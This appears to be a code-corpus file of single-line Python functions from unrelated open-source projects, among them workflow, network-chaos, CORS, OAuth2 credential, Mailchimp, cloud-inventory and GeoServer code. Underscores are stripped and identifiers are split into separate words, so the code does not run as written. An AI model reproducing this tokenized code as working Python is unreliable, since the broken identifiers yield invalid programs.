def eval kwargs ( kwargs , my task ) : results = { } for kwarg , value in list ( kwargs . items ( ) ) : if isinstance ( value , Attrib ) or isinstance ( value , Path Attrib ) : results [ kwarg ] = valueof ( my task , value ) else : results [ kwarg ] = value return results
def restart ( self , my task ) : if not my task . has state ( Task . WAITING ) : raise Workflow Exception ( my task , "Cannot refire a task that is not" "in WAITING state" ) # Check state of existing call and abort it (save history) if my task . get internal data ( 'task id' ) is not None : if not hasattr ( my task , 'async call' ) : task id = my task . get internal data ( 'task id' ) my task . async call = default app . Async Result ( task id ) my task . deserialized = True my task . async call . state # manually refresh async call = my task . async call if async call . state == 'FAILED' : pass elif async call . state in [ 'RETRY' , 'PENDING' , 'STARTED' ] : async call . revoke ( ) LOG . info ( "Celery task '%s' was in %s state and was revoked" % ( async call . state , async call ) ) elif async call . state == 'SUCCESS' : LOG . warning ( "Celery task '%s' succeeded, but a refire was " "requested" % async call ) self . clear celery task data ( my task ) # Retrigger return self . start ( my task )
def clear celery task data ( self , my task ) : # Save history if 'task id' in my task . internal data : # Save history for diagnostics/forensics history = my task . get internal data ( 'task history' , [ ] ) history . append ( my task . get internal data ( 'task id' ) ) del my task . internal data [ 'task id' ] my task . set internal data ( task history = history ) if 'task state' in my task . internal data : del my task . internal data [ 'task state' ] if 'error' in my task . internal data : del my task . internal data [ 'error' ] if hasattr ( my task , 'async call' ) : delattr ( my task , 'async call' ) if hasattr ( my task , 'deserialized' ) : delattr ( my task , 'deserialized' )
def start ( self , my task , force = False ) : # Deserialize async call if necessary if not hasattr ( my task , 'async call' ) and my task . get internal data ( 'task id' ) is not None : task id = my task . get internal data ( 'task id' ) my task . async call = default app . Async Result ( task id ) my task . deserialized = True LOG . debug ( "Reanimate Async Call %s" % task id ) # Make the call if not already done if not hasattr ( my task , 'async call' ) : self . send call ( my task ) # Get call status (and manually refresh if deserialized) if getattr ( my task , "deserialized" , False ) : my task . async call . state # must manually refresh if deserialized if my task . async call . state == 'FAILURE' : LOG . debug ( "Async Call for task '%s' failed: %s" % ( my task . get name ( ) , my task . async call . info ) ) info = { } info [ 'traceback' ] = my task . async call . traceback info [ 'info' ] = Serializable ( my task . async call . info ) info [ 'state' ] = my task . async call . state my task . set internal data ( task state = info ) elif my task . async call . state == 'RETRY' : info = { } info [ 'traceback' ] = my task . async call . traceback info [ 'info' ] = Serializable ( my task . async call . info ) info [ 'state' ] = my task . async call . state my task . set internal data ( task state = info ) elif my task . async call . ready ( ) : result = my task . async call . result if isinstance ( result , Exception ) : LOG . warn ( "Celery call %s failed: %s" % ( self . call , result ) ) my task . set internal data ( error = Serializable ( result ) ) return False LOG . debug ( "Completed celery call %s with result=%s" % ( self . call , result ) ) # Format result if self . result key : data = { self . result key : result } else : if isinstance ( result , dict ) : data = result else : data = { 'result' : result } # Load formatted result into internal data if self . merge results : merge dictionary ( my task . internal data , data ) else : my task . set data ( * * data ) return True else : LOG . debug ( "async call.ready()=%s. Try Fire for '%s' " "returning False" % ( my task . async call . ready ( ) , my task . get name ( ) ) ) return False
def ancestors ( self ) : results = [ ] def recursive find ancestors ( task , stack ) : for input in task . inputs : if input not in stack : stack . append ( input ) recursive find ancestors ( input , stack ) recursive find ancestors ( self , results ) return results
def package for editor signavio ( self , spec , filename ) : signavio file = filename [ : - len ( '.bpmn20.xml' ) ] + '.signavio.xml' if os . path . exists ( signavio file ) : self . write file to package zip ( "src/" + self . get zip path ( signavio file ) , signavio file ) f = open ( signavio file , 'r' ) try : signavio tree = ET . parse ( f ) finally : f . close ( ) svg node = one ( signavio tree . findall ( './/svg-representation' ) ) self . write to package zip ( "%s.svg" % spec . name , svg node . text )
def write meta data ( self ) : config = configparser . Config Parser ( ) config . add section ( 'Meta Data' ) config . set ( 'Meta Data' , 'entry point process' , self . wf spec . name ) if self . editor : config . set ( 'Meta Data' , 'editor' , self . editor ) for k , v in self . meta data : config . set ( 'Meta Data' , k , v ) if not self . PARSER CLASS == Bpmn Parser : config . set ( 'Meta Data' , 'parser class module' , inspect . getmodule ( self . PARSER CLASS ) . name ) config . set ( 'Meta Data' , 'parser class' , self . PARSER CLASS . name ) ini = String IO ( ) config . write ( ini ) self . write to package zip ( self . METADATA FILE , ini . getvalue ( ) )
def add main options ( cls , parser ) : parser . add option ( "-o" , "--output" , dest = "package file" , help = "create the BPMN package in the specified file" ) parser . add option ( "-p" , "--process" , dest = "entry point process" , help = "specify the entry point process" ) parser . add option ( "-c" , "--config-file" , dest = "config file" , help = "specify a config file to use" ) parser . add option ( "-i" , "--initialise-config-file" , action = "store true" , dest = "init config file" , default = False , help = "create a new config file from the specified options" ) group = Option Group ( parser , "BPMN Editor Options" , "These options are not required, but may be " " provided to activate special features of " "supported BPMN editors." ) group . add option ( "--editor" , dest = "editor" , help = "editors with special support: signavio" ) parser . add option group ( group )
def add additional options ( cls , parser ) : group = Option Group ( parser , "Target Engine Options" , "These options are not required, but may be " "provided if a specific " "BPMN application engine is targeted." ) group . add option ( "-e" , "--target-engine" , dest = "target engine" , help = "target the specified BPMN application engine" ) group . add option ( "-t" , "--target-version" , dest = "target engine version" , help = "target the specified version of the BPMN application engine" ) parser . add option group ( group )
def check args ( cls , config , options , args , parser , package file = None ) : if not args : parser . error ( "no input files specified" ) if not ( package file or options . package file ) : parser . error ( "no package file specified" ) if not options . entry point process : parser . error ( "no entry point process specified" )
def merge options and config ( cls , config , options , args ) : if args : config . set ( CONFIG SECTION NAME , 'input files' , ',' . join ( args ) ) elif config . has option ( CONFIG SECTION NAME , 'input files' ) : for i in config . get ( CONFIG SECTION NAME , 'input files' ) . split ( ',' ) : if not os . path . isabs ( i ) : i = os . path . abspath ( os . path . join ( os . path . dirname ( options . config file ) , i ) ) args . append ( i ) cls . merge option and config str ( 'package file' , config , options ) cls . merge option and config str ( 'entry point process' , config , options ) cls . merge option and config str ( 'target engine' , config , options ) cls . merge option and config str ( 'target engine version' , config , options ) cls . merge option and config str ( 'editor' , config , options )
def create meta data ( cls , options , args , parser ) : meta data = [ ] meta data . append ( ( 'spiff version' , cls . get version ( ) ) ) if options . target engine : meta data . append ( ( 'target engine' , options . target engine ) ) if options . target engine : meta data . append ( ( 'target engine version' , options . target engine version ) ) return meta data
def add notify ( self , task spec ) : if task spec . name in self . task specs : raise Key Error ( 'Duplicate task spec name: ' + task spec . name ) self . task specs [ task spec . name ] = task spec task spec . id = len ( self . task specs )
def get ready user tasks ( self ) : return [ t for t in self . get tasks ( Task . READY ) if not self . is engine task ( t . task spec ) ]
def deserialize ( cls , serializer , wf spec , s state , * * kwargs ) : return serializer . deserialize trigger ( wf spec , s state , * * kwargs )
def execute ( self , task , script , * * kwargs ) : locals ( ) . update ( kwargs ) exec ( script )
def container id ( self , name ) : container = self . containers . get ( name , None ) if not container is None : return container . get ( 'id' , None ) return None
def update ( self , containers ) : self . containers = deepcopy ( containers ) self . write ( containers , initialize = False )
def load ( self ) : try : with open ( self . state file ) as f : state = yaml . safe load ( f ) self . containers = state [ 'containers' ] except ( IO Error , OS Error ) as err : if err . errno == errno . ENOENT : raise Not Initialized Error ( "No blockade exists in this context" ) raise Inconsistent State Error ( "Failed to load Blockade state: " + str ( err ) ) except Exception as err : raise Inconsistent State Error ( "Failed to load Blockade state: " + str ( err ) )
def get blockade id from cwd ( self , cwd = None ) : if not cwd : cwd = os . getcwd ( ) # this follows a similar pattern as docker-compose uses parent dir = os . path . abspath ( cwd ) basename = os . path . basename ( parent dir ) . lower ( ) blockade id = re . sub ( r"[^a-z0-9]" , "" , basename ) if not blockade id : # if we can't get a valid name from CWD, use "default" blockade id = "default" return blockade id
def assure dir ( self ) : try : os . makedirs ( self . state dir ) except OS Error as err : if err . errno != errno . EEXIST : raise
def state delete ( self ) : try : os . remove ( self . state file ) except OS Error as err : if err . errno not in ( errno . EPERM , errno . ENOENT ) : raise try : os . rmdir ( self . state dir ) except OS Error as err : if err . errno not in ( errno . ENOTEMPTY , errno . ENOENT ) : raise
def write ( self , containers , initialize = True ) : path = self . state file self . assure dir ( ) try : flags = os . O WRONLY | os . O CREAT if initialize : flags |= os . O EXCL with os . fdopen ( os . open ( path , flags ) , "w" ) as f : yaml . safe dump ( self . base state ( containers ) , f ) except OS Error as err : if err . errno == errno . EEXIST : raise Already Initialized Error ( "Path %s exists. " "You may need to destroy a previous blockade." % path ) raise except Exception : # clean up our created file self . state delete ( ) raise
def insert rule ( self , chain , src = None , dest = None , target = None ) : if not chain : raise Value Error ( "Invalid chain" ) if not target : raise Value Error ( "Invalid target" ) if not ( src or dest ) : raise Value Error ( "Need src, dest, or both" ) args = [ "-I" , chain ] if src : args += [ "-s" , src ] if dest : args += [ "-d" , dest ] args += [ "-j" , target ] self . call ( * args )
def sm start ( self , * args , * * kwargs ) : millisec = random . randint ( self . start min delay , self . start max delay ) self . timer = threading . Timer ( millisec / 1000.0 , self . event timeout ) self . timer . start ( )
def sm to pain ( self , * args , * * kwargs ) : logger . info ( "Starting chaos for blockade %s" % self . blockade name ) self . do blockade event ( ) # start the timer to end the pain millisec = random . randint ( self . run min time , self . run max time ) self . timer = threading . Timer ( millisec / 1000.0 , self . event timeout ) self . timer . start ( )
def sm stop from no pain ( self , * args , * * kwargs ) : # Just stop the timer.  It is possible that it was too late and the # timer is about to run logger . info ( "Stopping chaos for blockade %s" % self . blockade name ) self . timer . cancel ( )
def sm relieve pain ( self , * args , * * kwargs ) : logger . info ( "Ending the degradation for blockade %s" % self . blockade name ) self . do reset all ( ) # set a timer for the next pain event millisec = random . randint ( self . start min delay , self . start max delay ) self . timer = threading . Timer ( millisec / 1000.0 , self . event timeout ) self . timer . start ( )
def sm stop from pain ( self , * args , * * kwargs ) : logger . info ( "Stopping chaos for blockade %s" % self . blockade name ) self . do reset all ( )
def sm cleanup ( self , * args , * * kwargs ) : if self . done notification func is not None : self . done notification func ( ) self . timer . cancel ( )
def cmd up ( opts ) : config = load config ( opts . config ) b = get blockade ( config , opts ) containers = b . create ( verbose = opts . verbose , force = opts . force ) print containers ( containers , opts . json )
def cmd destroy ( opts ) : config = load config ( opts . config ) b = get blockade ( config , opts ) b . destroy ( )
def cmd status ( opts ) : config = load config ( opts . config ) b = get blockade ( config , opts ) containers = b . status ( ) print containers ( containers , opts . json )
def cmd kill ( opts ) : kill signal = opts . signal if hasattr ( opts , 'signal' ) else "SIGKILL" with containers ( opts , Blockade . kill , signal = kill signal )
def cmd join ( opts ) : config = load config ( opts . config ) b = get blockade ( config , opts ) b . join ( )
def cmd logs ( opts ) : config = load config ( opts . config ) b = get blockade ( config , opts ) puts ( b . logs ( opts . container ) . decode ( encoding = 'UTF-8' ) )
def cmd daemon ( opts ) : if opts . data dir is None : raise Blockade Error ( "You must supply a data directory for the daemon" ) rest . start ( data dir = opts . data dir , port = opts . port , debug = opts . debug , host exec = get host exec ( ) )
def cmd add ( opts ) : config = load config ( opts . config ) b = get blockade ( config , opts ) b . add container ( opts . containers )
def cmd events ( opts ) : config = load config ( opts . config ) b = get blockade ( config , opts ) if opts . json : outf = None write = puts if opts . output is not None : outf = open ( opts . output , "w" ) write = outf . write try : delim = "" logs = b . get audit ( ) . read logs ( as json = False ) write ( '{"events": [' ) write ( os . linesep ) for l in logs : write ( delim + l ) delim = "," + os . linesep write ( os . linesep ) write ( ']}' ) finally : if opts . output is not None : outf . close ( ) else : puts ( colored . blue ( columns ( [ "EVENT" , 10 ] , [ "TARGET" , 16 ] , [ "STATUS" , 8 ] , [ "TIME" , 16 ] , [ "MESSAGE" , 25 ] ) ) ) logs = b . get audit ( ) . read logs ( as json = True ) for l in logs : puts ( columns ( [ l [ 'event' ] , 10 ] , [ str ( [ str ( t ) for t in l [ 'targets' ] ] ) , 16 ] , [ l [ 'status' ] , 8 ] , [ str ( l [ 'timestamp' ] ) , 16 ] , [ l [ 'message' ] , 25 ] ) )
def try match ( request origin , maybe regex ) : if isinstance ( maybe regex , Regex Object ) : return re . match ( maybe regex , request origin ) elif probably regex ( maybe regex ) : return re . match ( maybe regex , request origin , flags = re . IGNORECASE ) else : try : return request origin . lower ( ) == maybe regex . lower ( ) except Attribute Error : return request origin == maybe regex
def get app kwarg dict ( app Instance = None ) : app = ( app Instance or current app ) # In order to support blueprints which do not have a config attribute app config = getattr ( app , 'config' , { } ) return { k . lower ( ) . replace ( 'cors ' , '' ) : app config . get ( k ) for k in CONFIG OPTIONS if app config . get ( k ) is not None }
def ensure iterable ( inst ) : if isinstance ( inst , string types ) : return [ inst ] elif not isinstance ( inst , collections . Iterable ) : return [ inst ] else : return inst
def serialize options ( opts ) : options = ( opts or { } ) . copy ( ) for key in opts . keys ( ) : if key not in DEFAULT OPTIONS : LOG . warning ( "Unknown option passed to Flask-CORS: %s" , key ) # Ensure origins is a list of allowed origins with at least one entry. options [ 'origins' ] = sanitize regex param ( options . get ( 'origins' ) ) options [ 'allow headers' ] = sanitize regex param ( options . get ( 'allow headers' ) ) # This is expressly forbidden by the spec. Raise a value error so people # don't get burned in production. if r'.*' in options [ 'origins' ] and options [ 'supports credentials' ] and options [ 'send wildcard' ] : raise Value Error ( "Cannot use supports credentials in conjunction with" "an origin string of '*'. See: " "http://www.w3.org/TR/cors/#resource-requests" ) serialize option ( options , 'expose headers' ) serialize option ( options , 'methods' , upper = True ) if isinstance ( options . get ( 'max age' ) , timedelta ) : options [ 'max age' ] = str ( int ( options [ 'max age' ] . total seconds ( ) ) ) return options
def get Json ( url , token = '' , version = '' ) : if token : return get Json IEX Cloud ( url , token , version ) return get Json Orig ( url )
def bulk Minute Bars ( symbol , dates , token = '' , version = '' ) : raise If Not Str ( symbol ) dates = [ str Or Date ( date ) for date in dates ] list orig = dates . class args = [ ] for date in dates : args . append ( ( symbol , '1d' , date , token , version ) ) pool = Thread Pool ( 20 ) rets = pool . starmap ( chart , args ) pool . close ( ) return list orig ( itertools . chain ( * rets ) )
def bulk Minute Bars DF ( symbol , dates , token = '' , version = '' ) : data = bulk Minute Bars ( symbol , dates , token , version ) df = pd . Data Frame ( data ) if df . empty : return df to Datetime ( df ) df . set index ( [ 'date' , 'minute' ] , inplace = True ) return df
def start ( self ) : if self . extra args : sys . exit ( '{} takes no extra arguments' . format ( self . name ) ) else : if self . toggle value : nbextensions . install nbextension python ( pkg name , overwrite = True , symlink = False , user = self . user , sys prefix = self . sys prefix , prefix = None , nbextensions dir = None , logger = None ) else : nbextensions . uninstall nbextension python ( pkg name , user = self . user , sys prefix = self . sys prefix , prefix = None , nbextensions dir = None , logger = None ) self . toggle nbextension python ( pkg name ) self . toggle server extension python ( pkg name )
def start ( self ) : super ( Jupyter Tensorboard App , self ) . start ( ) subcmds = ", " . join ( sorted ( self . subcommands ) ) sys . exit ( "Please supply at least one subcommand: %s" % subcmds )
def credentials from request ( request ) : # ORM storage requires a logged in user if ( oauth2 settings . storage model is None or request . user . is authenticated ( ) ) : return get storage ( request ) . get ( ) else : return None
def locked delete ( self ) : filters = { self . key name : self . key value } self . session . query ( self . model class ) . filter by ( * * filters ) . delete ( )
def generate assertion ( self ) : now = int ( time . time ( ) ) payload = { 'aud' : self . token uri , 'scope' : self . scopes , 'iat' : now , 'exp' : now + self . MAX TOKEN LIFETIME SECS , 'iss' : self . service account email , } payload . update ( self . kwargs ) return crypt . make signed jwt ( self . signer , payload , key id = self . private key id )
def get well known file ( ) : # TODO(orestica): Revisit this method once gcloud provides a better way # of pinpointing the exact location of the file. default config dir = os . getenv ( CLOUDSDK CONFIG ENV VAR ) if default config dir is None : if os . name == 'nt' : try : default config dir = os . path . join ( os . environ [ 'APPDATA' ] , CLOUDSDK CONFIG DIRECTORY ) except Key Error : # This should never happen unless someone is really # messing with things. drive = os . environ . get ( 'System Drive' , 'C:' ) default config dir = os . path . join ( drive , '\\' , CLOUDSDK CONFIG DIRECTORY ) else : default config dir = os . path . join ( os . path . expanduser ( '~' ) , '.config' , CLOUDSDK CONFIG DIRECTORY ) return os . path . join ( default config dir , WELL KNOWN CREDENTIALS FILE )
def get application default credential from file ( filename ) : # read the credentials from the file with open ( filename ) as file obj : client credentials = json . load ( file obj ) credentials type = client credentials . get ( 'type' ) if credentials type == AUTHORIZED USER : required fields = set ( [ 'client id' , 'client secret' , 'refresh token' ] ) elif credentials type == SERVICE ACCOUNT : required fields = set ( [ 'client id' , 'client email' , 'private key id' , 'private key' ] ) else : raise Application Default Credentials Error ( "'type' field should be defined (and have one of the '" + AUTHORIZED USER + "' or '" + SERVICE ACCOUNT + "' values)" ) missing fields = required fields . difference ( client credentials . keys ( ) ) if missing fields : raise exception for missing fields ( missing fields ) if client credentials [ 'type' ] == AUTHORIZED USER : return Google Credentials ( access token = None , client id = client credentials [ 'client id' ] , client secret = client credentials [ 'client secret' ] , refresh token = client credentials [ 'refresh token' ] , token expiry = None , token uri = oauth2client . GOOGLE TOKEN URI , user agent = 'Python client library' ) else : # client credentials['type'] == SERVICE ACCOUNT from oauth2client import service account return service account . JWT Access Credentials . from json keyfile dict ( client credentials )
def oauth2 web server flow params ( kwargs ) : params = { 'access type' : 'offline' , 'response type' : 'code' , } params . update ( kwargs ) # Check for the presence of the deprecated approval prompt param and # warn appropriately. approval prompt = params . get ( 'approval prompt' ) if approval prompt is not None : logger . warning ( 'The approval prompt parameter for O Auth2Web Server Flow is ' 'deprecated. Please use the prompt parameter instead.' ) if approval prompt == 'force' : logger . warning ( 'approval prompt="force" has been adjusted to ' 'prompt="consent"' ) params [ 'prompt' ] = 'consent' del params [ 'approval prompt' ] return params
def generate refresh request body ( self ) : body = urllib . parse . urlencode ( { 'grant type' : 'refresh token' , 'client id' : self . client id , 'client secret' : self . client secret , 'refresh token' : self . refresh token , } ) return body
def load client secrets ( self , filename ) : client type , client info = clientsecrets . loadfile ( filename ) if client type != clientsecrets . TYPE WEB : raise Value Error ( 'The flow specified in {0} is not supported.' . format ( client type ) ) self . client id = client info [ 'client id' ] self . client secret = client info [ 'client secret' ]
def make flow ( self , return url = None , * * kwargs ) : # Generate a CSRF token to prevent malicious requests. csrf token = hashlib . sha256 ( os . urandom ( 1024 ) ) . hexdigest ( ) session [ CSRF KEY ] = csrf token state = json . dumps ( { 'csrf token' : csrf token , 'return url' : return url } ) kw = self . flow kwargs . copy ( ) kw . update ( kwargs ) extra scopes = kw . pop ( 'scopes' , [ ] ) scopes = set ( self . scopes ) . union ( set ( extra scopes ) ) flow = client . O Auth2Web Server Flow ( client id = self . client id , client secret = self . client secret , scope = scopes , state = state , redirect uri = url for ( 'oauth2.callback' , external = True ) , * * kw ) flow key = FLOW KEY . format ( csrf token ) session [ flow key ] = pickle . dumps ( flow ) return flow
def credentials ( self ) : ctx = app ctx stack . top if not hasattr ( ctx , CREDENTIALS KEY ) : ctx . google oauth2 credentials = self . storage . get ( ) return ctx . google oauth2 credentials
def has credentials ( self ) : if not self . credentials : return False # Is the access token expired? If so, do we have an refresh token? elif ( self . credentials . access token expired and not self . credentials . refresh token ) : return False else : return True
def locked delete ( self ) : if self . cache : self . cache . delete ( self . key name ) self . delete entity ( )
def Send Recv ( ) : port = int ( os . getenv ( DEVSHELL ENV , 0 ) ) if port == 0 : raise No Devshell Server ( ) sock = socket . socket ( ) sock . connect ( ( 'localhost' , port ) ) data = CREDENTIAL INFO REQUEST JSON msg = '{0}\n{1}' . format ( len ( data ) , data ) sock . sendall ( helpers . to bytes ( msg , encoding = 'utf-8' ) ) header = sock . recv ( 6 ) . decode ( ) if '\n' not in header : raise Communication Error ( 'saw no newline in the first 6 bytes' ) len str , json str = header . split ( '\n' , 1 ) to read = int ( len str ) - len ( json str ) if to read > 0 : json str += sock . recv ( to read , socket . MSG WAITALL ) . decode ( ) return Credential Info Response ( json str )
def locked delete ( self ) : query = { self . key name : self . key value } self . model class . objects . filter ( * * query ) . delete ( )
def all ( self , list id , * * queryparams ) : return self . mc client . get ( url = self . build path ( list id , 'segments' ) , * * queryparams )
def get ( self , list id , segment id ) : return self . mc client . get ( url = self . build path ( list id , 'segments' , segment id ) )
def update ( self , list id , segment id , data ) : return self . mc client . patch ( url = self . build path ( list id , 'segments' , segment id ) , data = data )
def delete ( self , list id , segment id ) : return self . mc client . delete ( url = self . build path ( list id , 'segments' , segment id ) )
def create ( self , list id , data ) : return self . mc client . post ( url = self . build path ( list id , 'segments' ) , data = data )
def get metadata ( self ) : try : r = requests . get ( 'https://login.mailchimp.com/oauth2/metadata' , auth = self ) except requests . exceptions . Request Exception as e : raise e else : r . raise for status ( ) output = r . json ( ) if 'error' in output : raise requests . exceptions . Request Exception ( output [ 'error' ] ) return output
def get access details ( self , key = None ) : if key in self . CACHE STATS : return self . CACHE STATS [ 'access stats' ] [ key ] else : return self . CACHE STATS [ 'access stats' ]
def get stats ( self ) : expired = sum ( [ x [ 'expired' ] for , x in self . CACHE STATS [ 'access stats' ] . items ( ) ] ) miss = sum ( [ x [ 'miss' ] for , x in self . CACHE STATS [ 'access stats' ] . items ( ) ] ) hit = sum ( [ x [ 'hit' ] for , x in self . CACHE STATS [ 'access stats' ] . items ( ) ] ) return { 'totals' : { 'keys' : len ( self . CACHE STATS [ 'access stats' ] ) , 'expired' : expired , 'miss' : miss , 'hit' : hit , } }
def get vpc flow logs ( vpc , * * conn ) : fl result = describe flow logs ( Filters = [ { "Name" : "resource-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) fl ids = [ ] for fl in fl result : fl ids . append ( fl [ "Flow Log Id" ] ) return fl ids
def get classic link ( vpc , * * conn ) : result = { } try : cl result = describe vpc classic link ( Vpc Ids = [ vpc [ "id" ] ] , * * conn ) [ 0 ] result [ "Enabled" ] = cl result [ "Classic Link Enabled" ] # Check for DNS as well: dns result = describe vpc classic link dns support ( Vpc Ids = [ vpc [ "id" ] ] , * * conn ) [ 0 ] result [ "Dns Enabled" ] = dns result [ "Classic Link Dns Supported" ] except Client Error as e : # This is not supported for all regions. if 'Unsupported Operation' not in str ( e ) : raise e return result
def get internet gateway ( vpc , * * conn ) : result = { } ig result = describe internet gateways ( Filters = [ { "Name" : "attachment.vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) if ig result : # Only 1 IG can be attached to a VPC: result . update ( { "State" : ig result [ 0 ] [ "Attachments" ] [ 0 ] [ "State" ] , "Id" : ig result [ 0 ] [ "Internet Gateway Id" ] , "Tags" : ig result [ 0 ] . get ( "Tags" , [ ] ) } ) return result
def get vpc peering connections ( vpc , * * conn ) : accepter result = describe vpc peering connections ( Filters = [ { "Name" : "accepter-vpc-info.vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) requester result = describe vpc peering connections ( Filters = [ { "Name" : "requester-vpc-info.vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) # Assuming that there will be no duplicates: peer ids = [ ] for peering in accepter result + requester result : peer ids . append ( peering [ "Vpc Peering Connection Id" ] ) return peer ids
def get subnets ( vpc , * * conn ) : subnets = describe subnets ( Filters = [ { "Name" : "vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) s ids = [ ] for s in subnets : s ids . append ( s [ "Subnet Id" ] ) return s ids
def get route tables ( vpc , * * conn ) : route tables = describe route tables ( Filters = [ { "Name" : "vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) rt ids = [ ] for r in route tables : rt ids . append ( r [ "Route Table Id" ] ) return rt ids
def get network acls ( vpc , * * conn ) : route tables = describe network acls ( Filters = [ { "Name" : "vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) nacl ids = [ ] for r in route tables : nacl ids . append ( r [ "Network Acl Id" ] ) return nacl ids
def get gcp client ( * * kwargs ) : return gcp client ( project = kwargs [ 'project' ] , mod name = kwargs [ 'mod name' ] , pkg name = kwargs . get ( 'pkg name' , 'google.cloud' ) , key file = kwargs . get ( 'key file' , None ) , http auth = kwargs . get ( 'http' , None ) , user agent = kwargs . get ( 'user agent' , None ) )
def get creds from kwargs ( kwargs ) : creds = { 'key file' : kwargs . pop ( 'key file' , None ) , 'http auth' : kwargs . pop ( 'http auth' , None ) , 'project' : kwargs . get ( 'project' , None ) , 'user agent' : kwargs . pop ( 'user agent' , None ) , 'api version' : kwargs . pop ( 'api version' , 'v1' ) } return ( creds , kwargs )
def gce list aggregated ( service = None , key name = 'name' , * * kwargs ) : resp list = [ ] req = service . aggregated List ( * * kwargs ) while req is not None : resp = req . execute ( ) for location , item in resp [ 'items' ] . items ( ) : if key name in item : resp list . extend ( item [ key name ] ) req = service . aggregated List next ( previous request = req , previous response = resp ) return resp list
def gce list ( service = None , * * kwargs ) : resp list = [ ] req = service . list ( * * kwargs ) while req is not None : resp = req . execute ( ) for item in resp . get ( 'items' , [ ] ) : resp list . append ( item ) req = service . list next ( previous request = req , previous response = resp ) return resp list
def service list ( service = None , key name = None , * * kwargs ) : resp list = [ ] req = service . list ( * * kwargs ) while req is not None : resp = req . execute ( ) if key name and key name in resp : resp list . extend ( resp [ key name ] ) else : resp list . append ( resp ) # Not all list calls have a list next if hasattr ( service , 'list next' ) : req = service . list next ( previous request = req , previous response = resp ) else : req = None return resp list
def get cache access details ( key = None ) : from cloudaux . gcp . decorators import GCP CACHE return GCP CACHE . get access details ( key = key )
def get role managed policy documents ( role , client = None , * * kwargs ) : policies = get role managed policies ( role , force client = client ) policy names = ( policy [ 'name' ] for policy in policies ) delayed gmpd calls = ( delayed ( get managed policy document ) ( policy [ 'arn' ] , force client = client ) for policy in policies ) policy documents = Parallel ( n jobs = 20 , backend = "threading" ) ( delayed gmpd calls ) return dict ( zip ( policy names , policy documents ) )
def get group policy document ( group name , policy name , client = None , * * kwargs ) : return client . get group policy ( Group Name = group name , Policy Name = policy name , * * kwargs ) [ 'Policy Document' ]
def get base ( server certificate , * * conn ) : server certificate [ ' version' ] = 1 # Get the initial cert details: cert details = get server certificate api ( server certificate [ 'Server Certificate Name' ] , * * conn ) if cert details : server certificate . update ( cert details [ 'Server Certificate Metadata' ] ) server certificate [ 'Certificate Body' ] = cert details [ 'Certificate Body' ] server certificate [ 'Certificate Chain' ] = cert details . get ( 'Certificate Chain' , None ) # Cast dates from a datetime to something JSON serializable. server certificate [ 'Upload Date' ] = get iso string ( server certificate [ 'Upload Date' ] ) server certificate [ 'Expiration' ] = get iso string ( server certificate [ 'Expiration' ] ) return server certificate
def get security group ( security group , flags = FLAGS . ALL , * * kwargs ) : result = registry . build out ( flags , start with = security group , pass datastructure = True , * * kwargs ) result . pop ( 'security group rules' , [ ] ) return result
def get inline policies ( group , * * conn ) : policy list = list group policies ( group [ 'Group Name' ] ) policy documents = { } for policy in policy list : policy documents [ policy ] = get group policy document ( group [ 'Group Name' ] , policy , * * conn ) return policy documents
def get managed policies ( group , * * conn ) : managed policies = list attached group managed policies ( group [ 'Group Name' ] , * * conn ) managed policy names = [ ] for policy in managed policies : managed policy names . append ( policy [ 'Policy Name' ] ) return managed policy names
def get users ( group , * * conn ) : group details = get group api ( group [ 'Group Name' ] , * * conn ) user list = [ ] for user in group details . get ( 'Users' , [ ] ) : user list . append ( user [ 'User Name' ] ) return user list
def get base ( group , * * conn ) : group [ ' version' ] = 1 # Get the initial group details (only needed if we didn't grab the users): group . update ( get group api ( group [ 'Group Name' ] , users = False , * * conn ) [ 'Group' ] ) # Cast Create Date from a datetime to something JSON serializable. group [ 'Create Date' ] = get iso string ( group [ 'Create Date' ] ) return group
def get short version ( self ) : gs version = self . get version ( ) match = re . compile ( r'[^\d.]+' ) return match . sub ( '' , gs version ) . strip ( '.' )
def delete granule ( self , coverage , store , granule id , workspace = None ) : params = dict ( ) workspace name = workspace if isinstance ( store , basestring ) : store name = store else : store name = store . name workspace name = store . workspace . name if workspace name is None : raise Value Error ( "Must specify workspace" ) url = build url ( self . service url , [ "workspaces" , workspace name , "coveragestores" , store name , "coverages" , coverage , "index/granules" , granule id , ".json" ] , params ) # DELETE /workspaces/<ws>/coveragestores/<name>/coverages/<coverage>/index/granules/<granule id>.json headers = { "Content-type" : "application/json" , "Accept" : "application/json" } resp = self . http request ( url , method = 'delete' , headers = headers ) if resp . status code != 200 : Failed Request Error ( 'Failed to delete granule from mosaic {} : {}, {}' . format ( store , resp . status code , resp . text ) ) self . cache . clear ( ) # maybe return a list of all granules? return None
def list granules ( self , coverage , store , workspace = None , filter = None , limit = None , offset = None ) : params = dict ( ) if filter is not None : params [ 'filter' ] = filter if limit is not None : params [ 'limit' ] = limit if offset is not None : params [ 'offset' ] = offset workspace name = workspace if isinstance ( store , basestring ) : store name = store else : store name = store . name workspace name = store . workspace . name if workspace name is None : raise Value Error ( "Must specify workspace" ) url = build url ( self . service url , [ "workspaces" , workspace name , "coveragestores" , store name , "coverages" , coverage , "index/granules.json" ] , params ) # GET /workspaces/<ws>/coveragestores/<name>/coverages/<coverage>/index/granules.json headers = { "Content-type" : "application/json" , "Accept" : "application/json" } resp = self . http request ( url , headers = headers ) if resp . status code != 200 : Failed Request Error ( 'Failed to list granules in mosaic {} : {}, {}' . format ( store , resp . status code , resp . text ) ) self . cache . clear ( ) return resp . json ( )
def mosaic coverages ( self , store ) : params = dict ( ) url = build url ( self . service url , [ "workspaces" , store . workspace . name , "coveragestores" , store . name , "coverages.json" ] , params ) # GET /workspaces/<ws>/coveragestores/<name>/coverages.json headers = { "Content-type" : "application/json" , "Accept" : "application/json" } resp = self . http request ( url , headers = headers ) if resp . status code != 200 : Failed Request Error ( 'Failed to get mosaic coverages {} : {}, {}' . format ( store , resp . status code , resp . text ) ) self . cache . clear ( ) return resp . json ( )
